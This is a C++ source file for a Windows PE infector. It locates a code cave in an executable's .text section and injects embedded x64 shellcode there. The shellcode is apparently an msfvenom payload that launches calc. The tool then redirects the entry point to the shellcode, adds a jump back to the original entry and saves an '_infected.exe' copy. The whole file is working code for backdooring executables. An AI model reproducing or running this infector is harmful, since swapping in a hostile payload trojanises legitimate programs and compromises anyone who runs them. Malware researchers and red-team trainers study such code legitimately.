#include <stdio.h>
#include <filesystem>
#include <fstream>
#include <optional>
#include <string>
#include <vector>

#include <Windows.h>

#include "debug.h"

namespace fs = std::filesystem;

BYTE shellcode[] =
        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
        "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
        "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
        "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
        "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
        "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
        "\xd5\x63\x61\x6c\x63\x00";


std::vector<BYTE> read_file(const fs::path &filename)
{
    if (!fs::exists(filename)) {
        error("file not found: %s", filename.string().c_str());
        return {};
    }

    std::ifstream file(filename, std::ios::binary);
    if (!file) {
        error("cannot open: %s", filename.string().c_str());
        return {};
    }

    return std::vector<BYTE>(std::istreambuf_iterator<char>(file), std::istreambuf_iterator<char>());
}

bool write_file(const fs::path &filename, const std::vector<BYTE> &buf)
{
    if (fs::exists(filename)) {
        warn("%s exists, file will be overwritten", filename.filename().string().c_str());
    }

    std::ofstream file(filename, std::ios::binary);
    if (!file) {
        error("failed to open file for writing: %s", filename.string().c_str());
        return false;
    }

    file.write(reinterpret_cast<const char *>(buf.data()), buf.size());

    if (!file) {
        error("failed to write to file: %s", filename.string().c_str());
        return false;
    }

    info("successfully wrote %zu bytes to %s", buf.size(), filename.filename().string().c_str());
    return true;
}

bool is_pe(const std::vector<BYTE> &buf)
{
    if (buf.size() < sizeof(IMAGE_DOS_HEADER)) {
        error("file too small");
        return false;
    }

    auto dos = reinterpret_cast<const IMAGE_DOS_HEADER *>(buf.data());
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        error("invalid DOS signature: 0x%04X", dos->e_magic);
        return false;
    }

    if (dos->e_lfanew >= buf.size()) {
        error("invalid PE offset: 0x%08X", dos->e_lfanew);
        return false;
    }

    auto nt = reinterpret_cast<const IMAGE_NT_HEADERS *>(buf.data() + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        error("invalid PE signature: 0x%08X", nt->Signature);
        return false;
    }

    return true;
}

const IMAGE_SECTION_HEADER *get_section(const IMAGE_NT_HEADERS *nt, const char *name)
{
    auto sections = reinterpret_cast<const IMAGE_SECTION_HEADER *>(reinterpret_cast<const BYTE *>(nt) +
                                                                   sizeof(IMAGE_NT_HEADERS));

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (strncmp(reinterpret_cast<const char *>(sections[i].Name), name, 8) == 0) {
            return &sections[i];
        }
    }

    return nullptr;
}

void print_section(const IMAGE_SECTION_HEADER *section)
{
    if (!section)
        return;

    char name[9] = {0};
    memcpy(name, section->Name, 8);

    info("section: %s", name);
    printf("  Virtual Address:  0x%08X (RVA)\n", section->VirtualAddress);
    printf("  Virtual Size:     0x%08X (%u bytes)\n", section->Misc.VirtualSize, section->Misc.VirtualSize);
    printf("  Raw Data Offset:  0x%08X\n", section->PointerToRawData);
    printf("  Raw Data Size:    0x%08X (%u bytes)\n", section->SizeOfRawData, section->SizeOfRawData);
}

bool is_cave_byte(BYTE b)
{
    return b == 0x00 || b == 0xCC || b == 0x90;
}

struct CodeCave {
    size_t file_offset;  // 在檔案中的偏移
    size_t rva;          // 在記憶體中的 RVA
    size_t size;
    BYTE fill_byte;
};

CodeCave find_code_cave(const std::vector<BYTE> &buf, const IMAGE_SECTION_HEADER *section, DWORD min_size)
{
    DWORD sec_start = section->PointerToRawData;
    DWORD sec_end = sec_start + section->SizeOfRawData;
    DWORD sec_rva_base = section->VirtualAddress;

    info("finding code cave with size >= %u", min_size);

    for (DWORD i = sec_start; i < sec_end;) {
        if (!is_cave_byte(buf[i])) {
            i++;
            continue;
        }

        DWORD cave_start = i;
        DWORD cave_size = 0;
        BYTE fill_byte = buf[i];

        while (i < sec_end && buf[i] == fill_byte) {
            cave_size++;
            i++;
        }

        if (cave_size >= min_size) {
            // 計算 RVA: section RVA + (file offset - section file offset)
            DWORD cave_rva = sec_rva_base + (cave_start - sec_start);

            const char *fill_name = (fill_byte == 0x00) ? "NULL" : (fill_byte == 0xCC) ? "INT3" : "NOP";
            info("found cave: File Offset=0x%08X, RVA=0x%08X, Size=%u, Fill=0x%02X (%s)", cave_start, cave_rva,
                 cave_size, fill_byte, fill_name);

            return CodeCave{cave_start, cave_rva, cave_size, fill_byte};
        }
    }

    return CodeCave{0, 0, 0, 0};
}

void list_code_caves(const std::vector<BYTE> &buf, const IMAGE_SECTION_HEADER *section, DWORD min_size)
{
    DWORD sec_start = section->PointerToRawData;
    DWORD sec_end = sec_start + section->SizeOfRawData;
    DWORD sec_rva_base = section->VirtualAddress;
    int cave_count = 0;

    info("searching for code caves (min size: %u bytes)...", min_size);

    for (DWORD i = sec_start; i < sec_end;) {
        if (!is_cave_byte(buf[i])) {
            i++;
            continue;
        }

        BYTE fill_byte = buf[i];
        DWORD cave_start = i;
        DWORD cave_size = 0;

        while (i < sec_end && buf[i] == fill_byte) {
            cave_size++;
            i++;
        }

        if (cave_size >= min_size) {
            cave_count++;
            DWORD cave_rva = sec_rva_base + (cave_start - sec_start);
            const char *fill_name = (fill_byte == 0x00) ? "NULL" : (fill_byte == 0xCC) ? "INT3" : "NOP";

            printf("  [%d] File Offset: 0x%08X | RVA: 0x%08X | Size: %4u bytes | Fill: 0x%02X (%s)\n", cave_count,
                   cave_start, cave_rva, cave_size, fill_byte, fill_name);
        }
    }

    if (cave_count == 0) {
        warn("no code caves found");
    } else {
        ok("found %d code caves", cave_count);
    }
}

int main(int argc, char *argv[])
{
    if (argc != 2) {
        warn("usage: %s <path/to/pe>", fs::path(argv[0]).filename().string().c_str());
        return EXIT_FAILURE;
    }

    fs::path pe_name = argv[1];
    info("reading %s", pe_name.filename().string().c_str());

    std::vector<BYTE> buf = read_file(pe_name);
    if (buf.empty()) {
        return EXIT_FAILURE;
    }
    info("loaded %s (%zu bytes)", pe_name.filename().string().c_str(), buf.size());

    if (!is_pe(buf)) {
        return EXIT_FAILURE;
    }
    ok("valid PE file");


    auto dos = reinterpret_cast<const IMAGE_DOS_HEADER *>(buf.data());
    auto nt = reinterpret_cast<const IMAGE_NT_HEADERS *>(buf.data() + dos->e_lfanew);

    // 印出原始資訊
    size_t original_ep_rva = nt->OptionalHeader.AddressOfEntryPoint;
    size_t original_ep_va = nt->OptionalHeader.ImageBase + original_ep_rva;

    info("Image Base: 0x%08llx", nt->OptionalHeader.ImageBase);
    info("Original Entry Point (RVA): 0x%08llx", original_ep_rva);
    info("Original Entry Point (VA):  0x%08llx", original_ep_va);

    // 取得 .text section
    auto text_sec = get_section(nt, ".text");
    if (!text_sec) {
        error(".text section not found");
        return EXIT_FAILURE;
    }

    printf("\n");
    print_section(text_sec);
    printf("\n");

    // 尋找 code cave
    DWORD needed_size = sizeof(shellcode) - 1 + 5;  // 減去字串結尾的 null
    CodeCave cave = find_code_cave(buf, text_sec, needed_size);

    if (cave.size == 0) {
        error("failed to find code cave with size >= %u", needed_size);
        printf("\n");
        list_code_caves(buf, text_sec, 20);
        return EXIT_FAILURE;
    }

    size_t payload_va = nt->OptionalHeader.ImageBase + cave.rva;
    ok("payload location:");
    printf("  File Offset: 0x%08llx\n", cave.file_offset);
    printf("  RVA:         0x%08llx\n", cave.rva);
    printf("  VA:          0x%08llx\n", payload_va);
    printf("  Size:        %llu bytes\n\n", cave.size);

    // 複製 shellcode 到 code cave
    info("injecting shellcode...");
    memcpy(&buf[cave.file_offset], shellcode, sizeof(shellcode) - 1);

    int jmp_patch_offset = -11; // default is zero, but msfvenom will exit automatically
    DWORD jmp_file_offset = cave.file_offset + sizeof(shellcode) + jmp_patch_offset;
    DWORD jmp_rva = cave.rva + sizeof(shellcode) + jmp_patch_offset;

    int32_t jmp_offset = (int32_t) (original_ep_rva - (jmp_rva + 4));

    info("adding jmp to OEP:");
    printf("  Jmp at file offset:   0x%08x\n", jmp_file_offset);
    printf("  Jmp at RVA:           0x%08x\n", jmp_rva);
    printf("  Target (OEP) RVA:     0x%08llx\n", original_ep_rva);
    printf("  Relative offset:      0x%08x (%d)\n\n", (uint32_t) jmp_offset, jmp_offset);
    
    buf[jmp_file_offset - 1] = 0xE8;  // call opcode, -1 for null byte
    *reinterpret_cast<int32_t *>(&buf[jmp_file_offset]) = jmp_offset;

    info("Shellcode preview:");
    hexdump(&buf[cave.file_offset], 0x30);
    printf("\n");

    // 修改 Entry Point
    auto writable_nt = reinterpret_cast<IMAGE_NT_HEADERS *>(buf.data() + dos->e_lfanew);
    writable_nt->OptionalHeader.AddressOfEntryPoint = cave.rva;

    info("patching PE headers:");
    printf("  Old Entry Point (RVA):      0x%08llx\n", original_ep_rva);
    printf("  New Entry Point (RVA):      0x%08llx\n", cave.rva);

    // 寫入感染後的檔案
    fs::path output = pe_name;
    output.replace_filename(pe_name.stem().string() + "_infected.exe");

    printf("\n");
    if (!write_file(output, buf)) {
        return EXIT_FAILURE;
    }

    ok("infection complete: %s", output.string().c_str());
    return EXIT_SUCCESS;
}